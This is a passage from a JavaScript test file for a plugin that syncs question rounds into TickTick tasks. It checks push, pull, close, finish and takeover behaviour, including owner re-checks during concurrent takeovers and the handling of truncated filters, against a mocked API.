  for (let i = 0; i < 200; i++) tt.db.tasks.push({ id: `seed${i}`, projectId: listId, parentId: hostId, title: `s${i}`, kind: 'CHECKLIST', status: 0, tags: ['grill'], etag: 'z', desc: buildDesc({ key: `r1.${i + 1}`, context: 'c', rec: { label: 'a', why: 'w' } }) });
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });   // r2.* land beyond the 200 cap
  const r = await pull(ctx);
  assert.equal(r.truncated, true);
  assert.deepEqual(r.questions.filter((q) => q.key.startsWith('r2.')).map((q) => [q.key, q.signal, q.etag]), [['r2.1', 'unknown', null], ['r2.2', 'unknown', null]]);
  const before = tt.calls.length;
  await assert.rejects(close({ ...ctx, owner, input: { drop: ['r2.1'] } }), (/** @type {any} */ e) => e.exitCode === 2 && e.message === 'cannot drop while the filter is truncated');
  assert.ok(!tt.calls.slice(before).some((c) => c.method === 'POST' && c.path !== '/task/filter'));
  assert.equal(tt.find(p.questions[0].taskId).status, 0);
  assert.ok(!readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8').includes('ingested'));
  const { FINAL, TOUCHED } = await import('../../plugins/grill-over-ticktick/lib/rounds.mjs');
  assert.ok(!FINAL.has('unknown') && !TOUCHED.has('unknown'));
});

test('close with host: rewrites the host prose (state and trailing text unchanged) before any status write', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, hostId } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.find(hostId).content += '\nnote from the phone';
  const stateBefore = readBlock(tt.find(hostId).content).state;
  const before = tt.calls.length;
  const host = { goal: 'ship', decided: ['file (r1.2)', 'token in file (r2.1)'], open: ['r2.2 how — ⭐ env'], notAsked: ['ci'] };
  const r = await close({ ...ctx, owner, input: { answered: ['r2.1'], host } });
  assert.deepEqual(r.closed, ['r2.1']);
  const after = readBlock(tt.find(hostId).content);
  assert.deepEqual(after.state, stateBefore);
  assert.equal(after.prose, '📍 e\n\nGoal: ship\n\nDecided\n- file (r1.2)\n- token in file (r2.1)\n\nOpen\n- r2.2 how — ⭐ env\n\nNot asked yet\n- ci\n\nnote from the phone');
  const writes = tt.calls.slice(before).filter((c) => c.method === 'POST' && c.path !== '/task/filter').map((c) => c.path);
  assert.deepEqual(writes, [`/task/${hostId}`, `/task/${p.questions[0].taskId}`]);
  await assert.rejects(close({ ...ctx, owner, input: { host: { decided: 'x' } } }), (/** @type {any} */ e) => e.exitCode === 2 && /host\.decided/.test(e.message));
});

test('text typed below the host block is not a takeover: push keeps the state and moves the text above the new block', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, hostId } = await takeover(ctx);
  tt.find(hostId).content += '\nremember the CI box';
  const r = await pull(ctx);
  assert.equal(r.host.owner, owner); assert.equal(r.host.hasBlock, true);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const body = tt.find(hostId).content;
  assert.ok(body.includes('remember the CI box\n\n```grill\n'), body);
  assert.deepEqual(readBlock(body).state, { v: 1, owner, gen: 1, round: 2 });
  tt.find(hostId).content = 'wiped';
  assert.equal((await pull(ctx)).host.hasBlock, false);
});

test('push: question creates are not retried (503 → exit 1 after one POST /task)', async (t) => {
  let fail = false; let creates = 0;
  const { tt, ctx } = hooked(t, (_tt, path, init) => { if (fail && init?.method === 'POST' && path === '/task') { creates++; return new Response('', { status: 503 }); } });
  const { owner } = await takeover(ctx);
  fail = true;
  await assert.rejects(push({ ...ctx, owner, round: structuredClone(ROUND) }), (/** @type {any} */ e) => e.exitCode === 1 && e.extra?.status === 503);
  assert.equal(creates, 1);
  assert.equal(tt.db.tasks.filter((x) => x.kind === 'CHECKLIST').length, 0);
});

test('push re-checks the owner right before writing the host: a takeover during the lookups wins', async (t) => {
  let steal = false; let thief = '';
  const { tt, ctx } = hooked(t, async (tt2, path, init) => {
    if (steal && path === '/tag' && (init?.method ?? 'GET') === 'GET') { steal = false; thief = (await takeover({ ...ctx, random: () => 0.9 })).owner; }
  });
  const { owner, hostId } = await takeover(ctx);
  steal = true;
  await assert.rejects(push({ ...ctx, owner, round: structuredClone(ROUND) }), (/** @type {any} */ e) => e.exitCode === 3);
  assert.equal(readBlock(tt.find(hostId).content).state?.owner, thief);
  assert.equal(tt.db.tasks.filter((x) => x.kind === 'CHECKLIST').length, 0);
});

test('close re-checks the owner before writing ingested lines: a takeover mid-close consumes nothing', async (t) => {
  let steal = false;
  const { tt, ctx } = hooked(t, async (tt2, path, init) => {
    if (steal && init?.method === 'POST' && /^\/task\/t\d+$/.test(path) && JSON.parse(String(init.body)).status === 2) { steal = false; await takeover({ ...ctx, random: () => 0.9 }); }
  });
  const { owner, listId } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  steal = true;
  await assert.rejects(close({ ...ctx, owner, input: { answered: ['r2.1'], wontdo: ['r2.2'] } }), (/** @type {any} */ e) => e.exitCode === 3);
  assert.equal(tt.find(p.questions[0].taskId).status, 2);
  assert.ok(!readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8').includes('ingested'));
});

test('close re-checks the owner right before its host prose write: a takeover during fetchQuestions is not clobbered', async (t) => {
  let steal = false; let hostId = '';
  const { tt, ctx } = hooked(t, (tt2, path, init) => {
    if (steal && path === '/task/filter' && init?.method === 'POST') {
      steal = false;
      const { prose, state, trailing } = readBlock(tt2.find(hostId).content);
      if (!state) throw new Error('expected a state block');
      tt2.find(hostId).content = writeBlock(prose, { ...state, owner: 'o_other' }, trailing);
    }
  });
  const to = await takeover(ctx);
  hostId = to.hostId;
  const { owner } = to;
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  steal = true;
  const host = { goal: 'ship', decided: ['file (r1.2)', 'token in file (r2.1)'], open: ['r2.2 how — ⭐ env'], notAsked: ['ci'] };
  await assert.rejects(close({ ...ctx, owner, input: { answered: ['r2.1'], host } }), (/** @type {any} */ e) => e.exitCode === 3);
  assert.equal(readBlock(tt.find(hostId).content).state?.owner, 'o_other');
  assert.equal(tt.find(p.questions[0].taskId).status, 0);
});

test('pull: a question title without the [i/N] prefix (older task) → position/total null', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.find(p.questions[0].taskId).title = 'Where does the token live?';
  tt.find(p.questions[1].taskId).title = '\\[2/2\\] How is it read?';   // server-escaped prefix still parses
  const r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => [q.title, q.position, q.total]), [['Where does the token live?', null, null], ['\\[2/2\\] How is it read?', 2, 2]]);
});

test('push: untouched descs with the Next link read descChanged:false; an answer typed above the Next line is captured; re-push idempotent', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  const three = structuredClone(ROUND);
  three.questions.push({ key: 'r2.3', title: 't3', context: 'c', rec: { label: 'a', why: 'w' }, options: ['a', 'b'] });
  const p = await push({ ...ctx, owner, round: three });
  let r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => [q.descChanged, q.signal, q.answerText]), [[false, 'none', ''], [false, 'none', ''], [false, 'none', '']]);
  const id2 = p.questions[1].taskId;
  tt.editDesc(id2, tt.find(id2).desc.replace('✍️ Answer:\n', '✍️ Answer:\nenv only\n'));
  r = await pull(ctx);
  assert.deepEqual([r.questions[1].signal, r.questions[1].answerText], ['text', 'env only']);
  const before = tt.calls.length;
  const again = await push({ ...ctx, owner, round: structuredClone(three) });
  assert.deepEqual(again.questions, p.questions.map((q) => ({ ...q, created: false })));
  assert.ok(!tt.calls.slice(before).some((c) => c.method === 'POST' && c.path === '/task'));
});

test('close reopen of a consumed key writes `reopened` and the next pull sees ingested:false', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.tick(p.questions[0].taskId, 'env');
  await close({ ...ctx, owner, input: { answered: ['r2.1'] } });
  assert.equal((await pull(ctx)).questions[0].ingested, true);
  const r = await close({ ...ctx, owner, input: { reopen: ['r2.1', 'r2.2'] } });
  assert.deepEqual(r.reopened, ['r2.1', 'r2.2']);
  const log = readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8');
  assert.ok(log.endsWith('ingested r2.1\nreopened r2.1\nreopened r2.2\n'), log);
  const q = (await pull(ctx)).questions[0];
  assert.deepEqual([q.key, q.signal, q.ingested], ['r2.1', 'tick', false]);
});

test('finish re-checks the owner right before archiving: a takeover during fetchQuestions wins', async (t) => {
  let steal = false;
  const { tt, ctx } = hooked(t, async (_tt, path, init) => {
    if (steal && path === '/task/filter' && init?.method === 'POST') { steal = false; await takeover({ ...ctx, random: () => 0.9 }); }
  });
  const { owner, listId } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  steal = true;
  await assert.rejects(finish({ ...ctx, owner }), (/** @type {any} */ e) => e.exitCode === 3);
  assert.notEqual(tt.db.projects.find((x) => x.id === listId).closed, true);
});

test('finish refuses while the filter is truncated (exit 2), archiving nothing', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId, hostId } = await takeover(ctx);
  for (let i = 0; i < 200; i++) tt.db.tasks.push({ id: `seed${i}`, projectId: listId, parentId: hostId, title: `s${i}`, kind: 'CHECKLIST', status: 0, tags: ['grill'], etag: 'z', desc: buildDesc({ key: `r1.${i + 1}`, context: 'c', rec: { label: 'a', why: 'w' } }) });
  await assert.rejects(finish({ ...ctx, owner }), (/** @type {any} */ e) => e.exitCode === 2 && /truncated/.test(e.message));
  assert.notEqual(tt.db.projects.find((x) => x.id === listId).closed, true);
});

test('a filter or /data body of the wrong shape → exit 1 "unexpected response shape"', async (t) => {
  let mode = '';
  const { ctx } = hooked(t, (_tt, path, init) => {
    if (mode === 'filter' && path === '/task/filter') return new Response('{"tasks":[]}', { status: 200 });
    if (mode === 'data' && /\/data$/.test(path) && (init?.method ?? 'GET') === 'GET') return new Response('{"tasks":{}}', { status: 200 });
  });
  const { owner } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  for (const m of ['filter', 'data']) {
    mode = m;
    await assert.rejects(pull(ctx), (/** @type {any} */ e) => e.exitCode === 1 && e.code === 'api' && /unexpected response shape/.test(e.message), m);
  }
});

test('takeover creates the grill tag when it is missing (once)', async (t) => {
  const { tt, ctx } = setup(t);
  tt.seedEffort('e'); tt.db.tags.length = 0;
  await takeover(ctx);
  assert.deepEqual(tt.db.tags.map((x) => x.name), ['grill']);
  assert.equal(tt.calls.filter((c) => c.method === 'POST' && c.path === '/tag').length, 1);
  await takeover(ctx);
  assert.equal(tt.calls.filter((c) => c.method === 'POST' && c.path === '/tag').length, 1);
});

test('a host completed outside tt-grill reads as not found (the real /data is undone-only) → exit 6', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, hostId } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.setStatus(hostId, 2);
  await assert.rejects(pull(ctx), (/** @type {any} */ e) => e.exitCode === 6);
});

/** A keyed question task as an older (subtask) or current (top-level) tt-grill made it. */
const seedQ = (/** @type {any} */ tt, /** @type {string} */ listId, /** @type {string} */ id, /** @type {string} */ key, /** @type {string | undefined} */ parentId) =>
  tt.db.tasks.push({ id, projectId: listId, ...(parentId ? { parentId } : {}), title: key, kind: 'CHECKLIST', status: 0, tags: ['grill'], etag: 'z', items: [{ id: `${id}i`, title: '⭐ a', status: 0 }, { id: `${id}o`, title: OTHER_TITLE, status: 0 }], desc: buildDesc({ key, context: 'c', rec: { label: 'a', why: 'w' } }) });

test('legacy effort: a mixed list (one subtask question + one top-level question) is pulled, closed and finished alike', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId, hostId } = await takeover(ctx);
  seedQ(tt, listId, 'legacy', 'r1.1', hostId);
  seedQ(tt, listId, 'toplvl', 'r1.2', undefined);
  tt.tick('legacy', '⭐ a'); tt.tick('toplvl', '⭐ a');
  const r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => [q.key, q.taskId, q.signal]), [['r1.1', 'legacy', 'tick'], ['r1.2', 'toplvl', 'tick']]);
  const c = await close({ ...ctx, owner, input: { answered: ['r1.1', 'r1.2'] } });
  assert.deepEqual([c.closed, c.skipped], [['r1.1', 'r1.2'], []]);
  assert.deepEqual([tt.find('legacy').status, tt.find('toplvl').status], [2, 2]);
  const f = await finish({ ...ctx, owner });
  assert.deepEqual(f.decisions.map((d) => [d.key, d.ticked]), [['r1.1', ['a']], ['r1.2', ['a']]]);
});

test('push adopts a top-level question by its footer when the pushlog has no taskId for it', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId, hostId } = await takeover(ctx);
  // a first push wrote the host (round 2), created r2.2, then crashed before the log line
  tt.find(hostId).content = writeBlock('📍 e', { v: 1, owner, gen: 1, round: 2 });
  seedQ(tt, listId, 'pre', 'r2.2', undefined);
  const n = tt.db.tasks.length;
  const r = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  assert.deepEqual(r.questions.map((q) => [q.key, q.created]), [['r2.1', true], ['r2.2', false]]);
  assert.equal(r.questions[1].taskId, 'pre');
  assert.equal(tt.db.tasks.length, n + 1);
});

test('takeover of a tt-grill list made of host + top-level questions: not refused as foreign; a wiped state block rebuilds round from their footers', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, hostId } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.find(hostId).content = 'wiped';
  const b = await takeover({ ...ctx, random: () => 0.9 });
  assert.equal(b.hostId, hostId); assert.equal(b.created, false);
  assert.deepEqual(readBlock(tt.find(hostId).content).state, { v: 1, owner: b.owner, gen: 1, round: 2 });
});
